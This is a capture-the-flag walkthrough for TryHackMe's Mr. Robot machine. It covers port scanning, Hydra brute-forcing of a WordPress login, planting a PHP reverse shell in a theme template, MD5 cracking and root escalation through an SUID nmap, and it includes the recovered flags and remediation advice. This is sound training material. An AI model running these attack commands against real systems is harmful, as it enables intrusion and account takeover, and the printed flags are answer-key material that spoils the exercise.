# Mr. Robot CTF — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Boot2Root-blue.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange.svg)
![OS](https://img.shields.io/badge/OS-Linux-success.svg)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red.svg)

A comprehensive, professional penetration testing walkthrough for the **Mr. Robot CTF** machine on TryHackMe, inspired by the *Mr. Robot* television series.

---

## 📋 Executive Summary
The Mr. Robot target machine simulates an enterprise web server running Apache and WordPress. A full penetration test lifecycle was executed: web enumeration revealed sensitive wordlists and tokens in `robots.txt`, authentication enumeration confirmed user `Elliot`, dictionary optimization reduced a massive password list to crack WordPress credentials via Hydra, a PHP reverse shell yielded initial access, an MD5 hash crack escalated privileges to user `robot`, and an interactive SUID Nmap configuration allowed full root compromise.

* **Target OS:** Linux (Ubuntu)
* **Initial Access:** WordPress Admin compromise (`Elliot` : `ER28-0652`) -> Theme editor PHP reverse shell.
* **Privilege Escalation:** SUID `/usr/local/bin/nmap` interactive mode.
* **Flags Recovered:**
  * **Key 1:** `073403c8a58a1f80d943455fb30724b9`
  * **Key 2:** `822c73956184f694993bede3eb39f959`
  * **Key 3:** `04070acbb656b373308d8104de518216`
* **Artifacts in Directory:**
  * `fsocity.dic`: Raw wordlist retrieved from web root (~858k entries)
  * `clean.txt`: Deduplicated wordlist (~11.4k unique words)
  * `attack.txt`: Hydra brute-force command string
  * `shell.php`: PHP PentestMonkey reverse shell payload

---

## 🔍 Stage 1: Reconnaissance & Enumeration

### 1.1 Port Scanning
```bash
nmap -sC -sV -p- -oN nmap.txt <TARGET_IP>
```
* **Port 22/tcp:** Closed / Filtered
* **Port 80/tcp:** Open (Apache httpd)
* **Port 443/tcp:** Open (Apache SSL)

### 1.2 Web Reconnaissance & robots.txt
Navigating to `http://<TARGET_IP>/robots.txt` disclosed two key files:
```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

1. **Retrieving Key 1:**
   ```bash
   curl http://<TARGET_IP>/key-1-of-3.txt
   # 073403c8a58a1f80d943455fb30724b9
   ```

2. **Acquiring & Cleaning the Wordlist:**
   ```bash
   wget http://<TARGET_IP>/fsocity.dic
   sort -u fsocity.dic > clean.txt
   wc -l clean.txt
   ```
   *Deduplication reduced the wordlist from 858,160 lines to 11,451 unique lines, significantly accelerating brute-force efficiency.*

---

## 💥 Stage 2: Initial Foothold (WordPress Exploitation)

### 2.1 Username Enumeration
Visiting `/wp-login.php` revealed verbose error responses:
* Invalid username: `Invalid username.`
* Valid username test (`Elliot`): `The password you entered for the username Elliot is incorrect.`

### 2.2 Brute-Forcing Credentials with Hydra
```bash
hydra -l Elliot -P clean.txt <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&submit=Login:F=The password you entered for the username Elliot is incorrect"
```
* **Result:** `Elliot` : `ER28-0652`

### 2.3 Web Shell Deployment
1. Logged into the WordPress Dashboard at `/wp-admin`.
2. Navigated to **Appearance -> Editor -> 404 Template (`404.php`)**.
3. Injected the PHP reverse shell payload (`shell.php`) pointing to attacker IP on port `4444`.
4. Started listener and triggered the shell:
   ```bash
   nc -lvnp 4444
   curl http://<TARGET_IP>/wp-content/themes/twentyfifteen/404.php
   ```
5. Shell caught as `daemon`. Stabilized TTY:
   ```bash
   python -c 'import pty; pty.spawn("/bin/bash")'
   ```

---

## 📈 Stage 3: Lateral Movement & Privilege Escalation

### 3.1 Escalating to User `robot`
Inspecting `/home/robot`:
```bash
ls -la /home/robot
# -r-------- 1 robot robot   33 key-2-of-3.txt
# -rw-r--r-- 1 robot robot   39 password.raw-md5
```
Reading `password.raw-md5`:
```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```
Cracking MD5 hash:
* Hash: `c3fcd3d76192e4007dfb496cca67e13b`
* Plaintext: `abcdefghijklmnopqrstuvwxyz`

Switching to `robot`:
```bash
su robot
# Password: abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt
# 822c73956184f694993bede3eb39f959
```

### 3.2 Root Escalation (SUID Nmap)
Locating SUID binaries:
```bash
find / -perm -4000 -type f 2>/dev/null
```
Found `/usr/local/bin/nmap` with SUID permissions. Version 3.81 supports interactive shell spawning:
```bash
nmap --interactive
nmap> !sh
whoami
# root
cat /root/key-3-of-3.txt
# 04070acbb656b373308d8104de518216
```

---

## 🛡️ Remediation
1. **Remove Sensitive Files:** Never store dictionaries or keys in the web root.
2. **Suppress Verbose Errors:** Configure generic login error messages on authentication portals.
3. **Disable Theme/Plugin Editing:** Add `define('DISALLOW_FILE_EDIT', true);` to `wp-config.php`.
4. **Audit SUID Permissions:** Remove SUID bits from binaries capable of spawning subshells (`chmod u-s /usr/local/bin/nmap`).
